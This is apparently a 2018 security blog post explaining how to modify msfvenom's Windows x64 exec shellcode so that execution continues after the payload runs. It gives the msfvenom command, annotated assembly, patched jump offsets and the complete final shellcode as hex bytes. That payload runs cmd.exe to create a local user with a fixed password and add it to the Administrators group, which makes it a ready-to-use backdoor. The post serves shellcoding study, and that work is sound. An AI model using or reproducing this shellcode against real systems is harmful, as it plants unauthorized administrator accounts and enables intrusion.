---
layout: single
title: Altering Msfvenom Exec Payload to Work Without an ExitFunc
date: 2018-11-18
categories:
  - security
  - shellcoding
tags:
  - msfvenom
  - exitfunc
  - x64
  - windows
---
On a few occasions as of late, I've wanted to use the `windows[/x64]/exec` payload from `msfvenom`, but with the goal of:

1. Allowing execution to continue afterwards
2. Executing in a single threaded environment
3. Executing without an exception handler

Unfortunately, when setting the `EXITFUNC` option to `none`, no code is generated to allow execution to continue as normal after the payload has been executed, and ultimately results in an access violation.

The example I'll be going over in this post is specifically the x64 version of the exec payload, which differs slightly to the x86 version. Most notably, the calling convention is different, the x86 version will see all arguments pushed on to the stack, but the x64 version will put the first few arguments into registers.

To generate the base shellcode I'll be working with, I ran: `msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add di.security Disecurity1! && net localgroup administrators di.security /add"' EXITFUNC=none`

What Causes the Problem
-----------------------
The `exec` payload uses the [WinExec](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-winexec) function to run the command specified in the `CMD` option.

To push the command text specified in the `CMD` option on to the stack, it is defined as raw bytes at the end of the payload, preceded by a `call` instruction:

When `call` is used, the address of the next instruction is then pushed on to the stack, so the execution flow can return to the correct place later. In the context of shellcoding, the pointer to the next instruction is effectively a pointer to the string that has been defined in place, and avoids the need for N amount of `push` instructions.

![](/assets/images/altering-msfvenom-exec-payload-to-work-without-exitfunc/original_storing_of_cmd_on_stack.png)

If we were to take the first few bytes that appear after `call rbp` in the above screenshot and convert them to ASCII, we can see that it is the equivalent of `cmd.exe /k`:

```shell_session
$ echo -e "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x6b"
cmd.exe /k
```

Eventually, the execution of the payload will end up being passed to these bytes, which will lead to an error at some point, as the bytes are nonsensical in terms of actual operations.

The Solution
------------
The solution to this issue is quite simple. The ultimate goal will be to add some extra bytes before the command text bytes which will instruct the program to jump past the command text bytes so that normal operations can continue.

As you may be anticipating, doing this will cause an issue in that extra bytes will precede the command text in the call to `WinExec`. To avoid this becoming an issue, an additional change will need to be made to ensure the pointer used for the `lpCmdLine` argument is increased by an appropriate number of bytes, so that it points ahead of the new bytes being added.

The change to the command text area can be seen in the screenshot below:

![](/assets/images/altering-msfvenom-exec-payload-to-work-without-exitfunc/cmd-text-with-jmp.png)

Four new bytes have been added after `call rbp`, the first two are are for a `jmp` operation to jump forward past the in place bytes, and the subsequent two bytes are just two NOPs to visually show the separation.

With the new code in place to ensure the command text bytes are never executed, the change to offset the `lpCmdLine` pointer can be made.

The point at which `WinExec` is invoked is at the `jmp rax` operation. At this point, the command being executed will be stored in the `rcx` register. The code block to look for is:

```nasm
pop  r8              ; 4158
pop  r8              ; 4158
pop  rsi             ; 5E
pop  rcx             ; 59
pop  rdx             ; 5A
pop  r8              ; 4158
pop  r9              ; 4159
pop  r10             ; 415A
sub  rsp,byte +0x20  ; 4883EC20
push r10             ; 4152
jmp  rax             ; FFE0
```

As 4 bytes will be added before `jmp rax` to make the adjustment, and 4 bytes were added to jump over the command text, `rcx` needs to be adjusted by 8 bytes. To do this, `add rcx, 0x8` is inserted before `jmp rax`:

```nasm
push r10             ; 4152
add  rcx, byte +0x8  ; 4883C108
jmp  rax             ; FFE0
```

Fixing Relative Jumps
---------------------
The simple solution now becomes a bit more painful. Adding the adjustment to the `rcx` register causes a shift in a number of offsets by 4 bytes.

Thankfully, the visual aid on the left side of the screen in [x64dbg](https://x64dbg.com/) makes it a bit easier to identify affected jumps by showing where they would land if taken.

Any jump or call instruction that has an offset that went forward past `jmp rax` will need to have its offset increased by 4, where as any jump or call that went backwards will need to have its offset decreased by 4.

A total of 4 operations were found that needed to be changed:

- `E8 C0` (`call 0xca`) changes to `E8 C4`
- `74 67` (`jz 0xbf`) changes to `74 6B`
- `E3 56` (`jrcxz 0xbe`) changes to `E3 5A`
- The one jump backwards found towards the end of the payload changes from `E9 57 FF FF FF` to `E9 53 FF FF FF`

Wrapping Up & Testing
---------------------
Now that all the changes have been made, checking the value of `rcx` when sitting on the `jmp rax` instruction should show it pointing to the start of the command text bytes:

![](/assets/images/altering-msfvenom-exec-payload-to-work-without-exitfunc/winexec-rcx.png)

After the call to `WinExec`, the execution should eventually return to the short jump that was added before the command text bytes, which should jump straight over the entirety of the command text:

![](/assets/images/altering-msfvenom-exec-payload-to-work-without-exitfunc/post-execution.png)

What you place after the command text bytes is completely up to you. In this case, I placed a NOP sled, a stack adjustment and a call into some existing code.

After making these changes, the final payload (minus the additions after the final NOP sled) looks like this:

`\xfc\x48\x83\xe4\xf0\xe8\xc4\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6b\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5a\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\x48\x83\xc1\x08\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x53\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\xeb\x69\x90\x90\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x6b\x20\x22\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x2f\x61\x64\x64\x20\x64\x69\x2e\x73\x65\x63\x75\x72\x69\x74\x79\x20\x44\x69\x73\x65\x63\x75\x72\x69\x74\x79\x31\x21\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x64\x69\x2e\x73\x65\x63\x75\x72\x69\x74\x79\x20\x2f\x61\x64\x64\x22\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90`
